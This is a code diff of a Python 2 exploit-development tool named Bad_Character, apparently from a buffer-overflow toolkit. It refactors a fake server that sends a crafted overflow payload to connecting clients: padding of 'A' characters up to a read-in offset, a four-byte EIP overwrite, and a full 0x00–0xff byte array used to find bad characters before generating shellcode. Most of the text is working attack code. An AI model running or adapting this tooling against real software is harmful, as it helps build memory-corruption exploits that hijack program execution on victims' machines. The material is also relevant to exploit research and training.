@@ -20,14 +20,7 @@ Y="\033[1;33m"
 class Bad_Character:
 
        def __init__(self):
-            
-            global W
-            global R
-            global G
-            global O
-            global B
-            global P
-            global Y                          
+                        
             self.main()
        def HEX_array(self): 
              try:                
@@ -192,44 +185,36 @@ if __name__ =='__main__':
 class Bad_Character_Clinet:
 
        def __init__(self):
-            
-            global W
-            global R
-            global G
-            global O
-            global B
-            global P
-            global Y                          
+                         
             self.main()
        def Listen_FAKE(self):
                           
           try: 
-                             
-              self.ip_server= "0.0.0.0"
-              self.port= 21
+              with open('.data','r')as data:
+                   data_list      = list(data)                        
+                   self.port      = data_list[0]            
+              self.ip_server = "0.0.0.0"
               self.listen_sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
               self.listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-              self.listen_sock.bind((self.ip_server,self.port))
+              self.listen_sock.bind((self.ip_server,int(self.port)))
               self.listen_sock.listen(1)
-              time.sleep(2)
-              #self.listen_sock.settimeout(30)
-              print Y+"\n[#] "+W+P+"Bad Character Listen from "+W+R +" 0.0.0.0 "+W+P+" in port"+W,self.port,Y+"[<>]"+W
-              time.sleep(2)
-              print O+"\t\t\t\n>>>>"+W+Y+" Wating For incoming Connection "+W+O+" >>>>"+W
+              time.sleep(1)
+              print Y+"\n\r\r!---___"+W+R+ "Wating For incoming Connection"+W+Y+'___---!'+W 
           except socket.error, exc:               
-                time.sleep(3)
-                print O+"\n[(!)]"+W+Y+"Connection is Down >> Exception Socket.Error"+W+O+" :"+W +R+"%s\n" %exc+W
-                time.sleep(2) 
+                time.sleep(1)
+                print Y+"\n\r\r!---___"+W+P+ "Socket.Error "+W+O+"%s " %exc+W+Y+'___---!'+W
+                time.sleep(1) 
                 print Banner      
                 exit()
           except KeyboardInterrupt:  
                  print Banner      
                  exit()     
        def HEX_array(self): 
-             with open('.data','r')as data:
-               self.location =data.read()  
-               print self.location
-             try:                
+             try: 
+                 with open('.data','r')as data:
+                      data_list      = list(data)                        
+                      self.port      = data_list[0] 
+                      self.location  = data_list[1]               
                  self.payload = ''    
                  self.payload +='A'*int(self.location)
                  self.payload += '\x42\x42\x42\x42'
@@ -246,12 +231,12 @@ class Bad_Character_Clinet:
                       print R+self.hex_x+W 
                       print (O+'='*50+W)   
                       time.sleep(2)             
-                 print Y+"\n[+] "+W+B+"Server Listein  Ip "+W+O+"    : "+W, P+'0.0.0.0'+W
-                 time.sleep(2)
-                 print Y+"\n[+] "+W+B+"Server Listein Port "+W+O+"  : "+W, P+'21'+W
+                 print Y+"\n[+] "+W+B+"Server Listein  Ip "+W+O+"   : "+W, P+'0.0.0.0'+W
+                 time.sleep(1)
+                 print Y+"\n[+] "+W+B+"Server Listein Port "+W+O+"  : "+W, P+self.port+W
                  time.sleep(1)
                  print Y+"\n[+] "+W+B+"Overflow 0ffset at  "+W+O+"  : "+W,P+self.location+W
-                 time.sleep(2)
+                 time.sleep(1)
                  print Y+"\n[+] "+W+B+"Over write EIP Value "+W+O+" : "+W,P+'\\x42\\x42\\x42\\x42'+W 
                  self.hex_num_send   =''.join("\\x"+'{:02x}'.format(x)for x in range(0,256)) 
                  with open('textarray','w') as array_1 :
@@ -272,16 +257,15 @@ class Bad_Character_Clinet:
                   list_add.append(self.hex_input)                
                else:
                   print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed[?]" +W  
-                  time.sleep(2) 
-                  return self.input_hex()                 
+                  time.sleep(1) 
+                  self.input_hex()                 
                if len(self.hex_input)== 4 and '\\x' in self.hex_input :
                     self.input_send = self.hex_x.replace(self.hex_input,'')
                else:
-                  time.sleep(2) 
-                  print P+"\n[!] bad input order[!]"+W 
-                  time.sleep(2)    
-                  print R+"\n[#] Enter the Number in hexadecimal value "+W
-                  return self.input_hex()
+                  time.sleep(1) 
+                  print Y+"\n\r\r!---___"+W+R+ "Bad Input Format '\\xx' hexadecimal value"+W+Y+'___---!'+W 
+                  time.sleep(1)    
+                  self.input_hex()
           except KeyboardInterrupt:
                    print Banner
                    exit()                                                                                                                        
@@ -308,7 +292,7 @@ class Bad_Character_Clinet:
                             self.file = self.file1.decode('hex')                                                                 
                     else:                       
                         print P+"\n[?] the Bad_Character.py Not Found [",self.hex_input,"]  Maybe Removed [?]" +W
-                        time.sleep(2) 
+                        time.sleep(1) 
                         self.input_hex()                                               
                         self.HEX_FORMAT()
              except KeyboardInterrupt:
@@ -319,7 +303,7 @@ class Bad_Character_Clinet:
                  client , addr = self.listen_sock.accept()
                  time.sleep(2)
                  print Y+"\n[(-)]"+W+R+"BUFFER_HELPER CONNECTION ACCEPT FROM "+W+'%s:'%(addr[0],),P+"[(+)]"+W 
-                 client.settimeout(5)
+                 client.settimeout(3)
                  while True:
                         try:          
 		           client.sendall(self.payload +self.file +'\r\n')		        		 	       
@@ -332,42 +316,45 @@ class Bad_Character_Clinet:
                    exit()         
                                        
        def main(self):
-          self.HEX_array()
+          self.HEX_array()  
           self.Listen_FAKE()
           self.send()
           list=[]         
           while True:
             try:     
-              out_q = 'q'.lower() 
-              continue_skip = 'd'.lower()                     
-              time.sleep(2)               
-              self.input_hex()          
-              self.HEX_FORMAT()
-              self.Listen_FAKE()  
-              self.send()             
-              out = str(raw_input(P+"\n[*]"+W+B+"to quit press "+W+R+'Q'+W+B+" to continue press "+W+R+'D '+W+O+':'+W )).lower()
-              if self.hex_input not in list :
+              self.out_q = 'q'.lower() 
+              self.continue_skip = 'd'.lower()                     
+              time.sleep(1)  
+              self.input_hex() 
+              self.HEX_FORMAT()         
+              self.Listen_FAKE()
+              self.send()
+              def select():       
+                 self.out = str(raw_input(P+"\n[*] "+W+B+"to quit press "+W+R+'Q'+W+B+" to continue press "+W+R+'D '+W+O+':'+W )).lower()              
+                 if self.hex_input not in list :
                      list.append(self.hex_input) 
-              if out == out_q and len(out)==1 :                
-                 print Y+"\n[#] "+W+P+"Generant Shellcode with out :"+W,O+''.join(list)+W
-                 print O+"\n\t\t ***_***"+W+Y+" Test Bad Character is Finish "+W+O+"***_*** "+W
-                 print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
-                 os.remove('txt')
-                 os.remove('textarray')   
-                 host_ip   = check_output(['hostname', '--all-ip-addresses']).decode('utf8').replace('\n','')
-                 with open('.data','a') as append:                       
-                       append_bad =append.write('\n'+str(''.join(list)+'\n'+ host_ip.replace(' ','\n')))            
-                 break
-              elif out == continue_skip and len(out)==1 : 
-                  pass  
-              else:
-                 print O+"[*] "+W+R+"\nPlease enter "+W+B+'Q '+W+R+" or "+W+B+" D "+W+O+"[#]"+W 
-                 self.input_hex()
-                 self.HEX_FORMAT()
-                 self.Listen_FAKE()
-                 self.send()
-                 self.main()                        
-              print Y+"\n[#] "+W+P+"Bad Character Removed is : "+W,O+''.join(list)+W                           
+                 if self.out == self.out_q and len(self.out)==1 :                
+                    print Y+"\n[#] "+W+P+"Generant Shellcode with out :"+W,O+''.join(list)+W
+                    time.sleep(2)
+                    print O+"\n\t\t ***_***"+W+Y+" Test Bad Character is Finish "+W+O+"***_*** "+W
+                    time.sleep(2)
+                    print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
+                    os.remove('txt')
+                    os.remove('textarray') 
+                    host_ip   = check_output(['hostname', '--all-ip-addresses']).decode('utf8').replace('\n','')
+                    with open('.data','a') as append:
+                        append_bad =append.write('\n'+str(''.join(list)+'\n'+ host_ip.replace(' ','\n')))                              
+                 elif self.out == self.continue_skip and len(self.continue_skip)==1 : 
+                    pass  
+                 else:
+                   time.sleep(2)
+                   print O+"\n[*] "+W+R+"Please enter "+W+B+'Q '+W+R+" or "+W+B+" D "+W+O+"[#]"+W  
+                   time.sleep(2)
+                   print Y+"\n[#] "+W+P+"Bad Character Removed is : "+W,O+''.join(list)+W
+                   return select()  
+              select()                    
+              if self.out == self.out_q :
+                break                          
             except KeyboardInterrupt:
                  print Banner
                  exit()
@@ -375,19 +362,12 @@ if __name__ =='__main__':
 
   Bad_Character_Clinet()  
   
-  
+
 
 class Bad_Character_HTTP:
       
        def __init__(self):
-            
-            global W
-            global R
-            global G
-            global O
-            global B
-            global P
-            global Y                          
+                                    
             self.main()
        def HEX_array(self): 
              try:                
@@ -556,6 +536,7 @@ class Bad_Character_HTTP:
                  print Banner
                  exit()
 if __name__ =='__main__':
+
    Bad_Character_HTTP()
 
 
